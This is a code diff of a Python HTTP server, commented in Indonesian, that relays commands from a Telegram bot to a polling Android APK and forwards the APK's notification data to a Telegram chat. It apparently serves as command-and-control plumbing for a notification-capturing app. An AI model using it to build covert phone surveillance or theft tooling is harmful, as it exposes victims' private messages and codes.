@@ -4,7 +4,7 @@ import urllib.request
 import urllib.parse
 import json
 
-# VARIABEL GLOBAL (Penyimpanan sementara selama server nyala)
+# Penyimpanan memori sementara
 last_command = ""
 
 class handler(BaseHTTPRequestHandler):
@@ -13,30 +13,29 @@ class handler(BaseHTTPRequestHandler):
         content_length = int(self.headers.get('Content-Length', 0))
         post_data = self.rfile.read(content_length).decode('utf-8')
 
-        # Cek apakah data ini dari Telegram (format JSON) atau dari APK (format text)
-        if post_data.startswith('{') and 'update_id' in post_data:
-            # --- DATA DARI TELEGRAM MASUK ---
+        # 1. Cek apakah data dari Telegram (format JSON)
+        if post_data.startswith('{') and 'message' in post_data:
             try:
                 data = json.loads(post_data)
                 msg = data.get("message", {}).get("text", "")
                 if msg:
-                    last_command = msg
+                    last_command = msg # Simpan perintah (misal /panic)
             except:
                 pass
             self.send_response(200)
             self.end_headers()
             self.wfile.write(b"OK")
             
+        # 2. Cek apakah data dari APK (teks biasa)
         else:
-            # --- DATA DARI APK (Mau minta perintah / kirim data) ---
-            # Jika APK ngirim teks "GET_CMD", kita balikin perintah terakhir
             if post_data == "GET_CMD":
+                # APK minta perintah, kita kasih perintah terakhir
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(last_command.encode('utf-8'))
-                last_command = "" # Hapus perintah setelah diambil
+                last_command = "" # Hapus setelah diambil APK
             else:
-                # Kalau bukan GET_CMD, berarti APK ngirim data notif. Teruskan ke Telegram
+                # APK ngirim notif, teruskan ke Telegram
                 token = os.environ.get('BOT_TOKEN')
                 chat_id = os.environ.get('CHAT_ID')
                 if token and chat_id:
